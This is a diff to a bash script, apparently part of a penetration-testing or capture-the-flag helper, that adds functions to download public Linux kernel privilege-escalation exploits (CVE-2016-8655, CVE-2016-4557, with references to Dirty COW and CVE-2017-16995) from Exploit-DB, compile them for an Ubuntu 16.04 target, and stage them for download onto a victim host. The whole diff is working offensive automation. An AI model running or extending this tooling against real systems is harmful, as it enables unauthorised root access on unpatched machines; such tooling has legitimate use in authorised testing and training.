@@ -108,6 +108,7 @@ create_redis_module() {
     local redismodule_header_url="https://raw.githubusercontent.com/RedisLabsModules/RedisModulesSDK/refs/heads/master/"
     if [[ -z $redis_version ]]; then
         redismodule_header_url+="redismodule.h"
+        redis_version="latest"
     else 
         redismodule_header_url+="$redis_version/redismodule.h"
     fi
@@ -232,7 +233,8 @@ perform_cve_2017_16995() {
         rm "$cve_filename"
     fi
     compress_file "$cve_filename" "$cve_dir"
-    download_linux_file "$cve_filename"
+    generate_exploit_download
+
 }
 
 
@@ -710,6 +712,8 @@ perform_cve_2020_7247() {
 
 }
 
+# dirty cow
+
 perform_cve_2016_5195 () {
     local cve_dir="CVE-2016-5195"
     local download_url="https://www.exploit-db.com/download/40839"    
@@ -814,4 +818,73 @@ perform_cve_2024_12905() {
     cp "$cve_dir/stage_1.tar" .
     cp "$cve_dir/stage_2.tar" .
 
+}
+
+perform_cve_2016_8655() {
+    local cve_dir="CVE-2016-8655"
+    if [[ ! -d "$cve_dir" ]]; then
+        mkdir "$cve_dir"
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -f 40871.c ]]; then
+        searchsploit -m 40871
+    fi
+    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
+        local exploit_executable="exploit"
+        if [[ ! -f "$exploit_executable" ]]; then
+            echo "Compiling exploit..."
+            echo "all:" > Makefile
+            echo -e "\tgcc -o $exploit_executable 40871.c -lpthread" >> Makefile
+            if [[ -z $target_os ]]; then
+                target_os="ubuntu:16.04"
+            fi
+            compile_cpp
+        else
+            echo "Exploit already compiled, skipping compilation."
+        fi
+    fi
+    popd || exit 1
+    generate_exploit_download
+}
+
+perform_cve_2016_4557() {
+    local cve_dir="CVE-2016-4557"
+    local url="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip"
+    if [[ ! -d "$cve_dir" ]]; then
+        wget "$url" -O "$cve_dir.zip"
+        unzip -n "$cve_dir.zip"
+        rm "$cve_dir.zip"
+        mv 39772/exploit.tar .
+        rm -rf 39772
+        rm -rf _MACOSX
+        tar xvf exploit.tar
+        rm exploit.tar
+        mv ebpf_mapfd_doubleput_exploit $cve_dir
+    
+    fi
+    pushd "$cve_dir" || exit 1
+    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
+        local exploit_executable="doubleput"
+        if [[ ! -f "$exploit_executable" ]]; then
+            echo "Compiling exploit..."
+            echo "all: $exploit_executable hello suidhelper" > Makefile
+            echo "hello:" >> Makefile
+            echo  -e "\tgcc -o hello hello.c -Wall \`pkg-config fuse --cflags --libs\`" >> Makefile
+            echo "suidhelper:" >> Makefile
+            echo  -e "\tgcc -o suidhelper suidhelper.c -Wall" >> Makefile
+            echo "$exploit_executable:" >> Makefile
+            echo  -e "\tgcc -o $exploit_executable $exploit_executable.c -Wall" >> Makefile
+            echo "clean:" >> Makefile
+            echo -e "\trm -f hello suidhelper $exploit_executable" >> Makefile
+            extra_packages="libfuse-dev pkg-config"
+            if [[ -z $target_os ]]; then
+                target_os="ubuntu:16.04"
+            fi
+            compile_cpp
+        else
+            echo "Exploit already compiled, skipping compilation."
+        fi
+    fi
+    popd || exit 1
+    generate_exploit_download
 }
